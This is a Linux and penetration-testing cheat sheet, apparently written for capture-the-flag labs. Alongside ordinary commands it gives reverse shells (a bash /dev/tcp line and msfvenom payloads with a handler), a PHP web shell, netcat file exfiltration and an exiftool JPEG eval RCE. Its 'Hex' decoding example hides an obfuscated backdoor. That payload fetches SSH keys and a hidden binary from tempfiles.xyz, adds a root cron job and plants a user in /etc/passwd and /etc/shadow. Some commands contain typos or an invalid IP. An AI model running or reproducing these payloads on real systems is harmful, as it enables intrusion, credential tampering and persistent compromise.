# Linux Helper

## Images

### Find images
```bash
localte -r jpg$
```

### Images' metadata
```bash
exiftool image.jpg
```

### Modifty images' metadata
```bash
exiftool -comment='<b>hi</b>' image.jpg
```

### JPEG RCE ([exploit](https://github.com/OneSecCyber/JPEG_RCE/blob/main/eval.config))
```sh
 exiftool -config eval.config image.jpg -eval='system("ls -la")' 
 ```

### Screenshot
```sh
sleep 2; scrot -s image.png
```


## Files and Folders
Find files/directories on the computer
```sh
find <path> <arguments>
```

```sh
find . -type f -printf "%f\t%p\t%u\t%g\t%m\n" | column -t
```

where:
* type f: especify the kid of file
* printf: prints the output with format
    * %f: file
    * %p: absolute path
    * %u: user
    * %g: group
    * %m: permission assigned in numerical mode
* column -t: prints with tabular mode

```sh
find . -name .hidden
```
where:
* . : current folder
* name: criteria to find, this will find by the name of the file
* .hidden: the filename

### Remove spaces
```sh
cat file.txt | grep word | sed 's/^ *//*'
```


## Encoding
### Base64
```bash
echo 'hi' | base64
```


## Decoding
### Base64
```bash
echo 'aGkK' | base64 -d
```

### Hex
```shell
echo -n "776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b" | xxd -ps -r
```

## Web Server
### Python
```shell
sudo python3 -m http.server 80
```

## Terminal
### Command Line
```sh
# rlwrap nc -nlvp <port>
rlwrap nc -nlvp 443
```

### Interactive Shell
```shell
# file: shell.txt
bash -i >& /dev/tcp/10.10.14.3/9001 0>&1

# listening terminal
nc -lvnp 9001
```

### Generate interactive shell
#### reverse shell
```sh
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename>.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o shell.exe
```

#### reverse meterpreter
```sh
# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename>.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o shell.exe
```

### Listening session
```sh
msfdb run
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
show options
set LHOST 10.10.14.29
set LPORT 4444
run
```

### TTY Shell bash python
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Python shell
```shell
# file cmd.php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

### Script shell
```shell
# remote machine
script /dev/null -c bash
tty
<ctrl+z>

#local machine
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 45 columns 174
```

### Privileges SUID
```shell
cd /
find \-perm -4000 -user root 2>/dev/null
# alternative:
@ find \-perm -4000 2>/dev/null
```

### NC command
```shell
#Sends files from remote server to local host
# remote server:
# nc localHostIp port < fileName.ext
nc 10.10.14.30 4646 < fileName.ext

# local host
# nc -nlvp port > fileName.ext
nc -nlvp 4646 > fileName.ext
```

### Get Capabilities 
```shell
which getcap
# redirect to null the errors: '2>/dev/null' or '&>/dev/null'
getcap -r / 2>/dev/null
```

### mount
```sh
mount | grep proc
```

### List process executing by other users
```sh
ps -faux
```

### List timers
```shel
cat /etc/crontab
systemctl list-timers
```

### List process executing to time interval
```shell
ps -eo command
```

### Diferences between process (alternative to psspy)
```shel
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
    old_process=$new_process
done
```

### Monitoring path each second
```shell
watch -n 1 ls -l
```

### Ping trace
```shell
ping -c 1 google.com -R
```

## nmap
Scanning open ports:

```shell
sudo  nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.145 -oG allPorts
```

Where:
```
-p-: scanning all the port's range (65535)
--open: filtering only open ports ( not close, filtered, etc)
-sS: scanning very fast, mode TCP without port scan
--min-rate: to send out packages no slower than n per second
-vvv: verbose mode, as soon as open ports are found, it'll report them in the console.
-n: without DNS' resolution
-oG: export the output in grep to the file allPorts
```

```shell
extractPorts allPorts
nmap -sCV -p22,80,6686 10.10.10.145 -oN targeted
cat targeted -l python
```

## SSH
### Permission 

List files and folders permissions
```sh
ls -l
<type> <user owner> <group> <other> 
```

output:
```sh
.rw-r--r-- root root 0 B Mon Jul 6 22:22:02 2020 B file. txt
```

where:
* type: it shows if the current  line is a file or directory
    * .: file
    * d: directory
* ---: kind of permissions, this is the same for: user, groups¯¯˘˘
    * r: read
    * w: write
    * x: execution

Change permissions:
```shell
chmod 600 id_rsa
```


### Connect to remote host private rsa
```shell
ssh -i id_rsa user@ip
```

### Connect to remote host with pass
```shell
# sshpass -p 'password' ssh user@remoteIp
sshpass -p 'ihatehackers' ssh steven1@10.10.11.146
```

Alternative:
```sh
ssh <user>@<server> -p <port>
<password>
```

```sh
ssh bandit0@bandit.labs.overthewire.org -p 2220
<password>
```


## Scan services
### WhatWeb |  [Wappalyzer](https://www.wappalyzer.com/)
```shel
whatweb http://10.10.10.11.146
```

### SearchExploit
```shell
searchexploit ssh user enumeration 
```

## Monitoring process
### [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
```sh
# download pspy64 to /tmp
chmod +x pspy64
```


## xargs
Executes a new command on the output of a previous command
```sh
find . -name .hidden | xargs cat
```

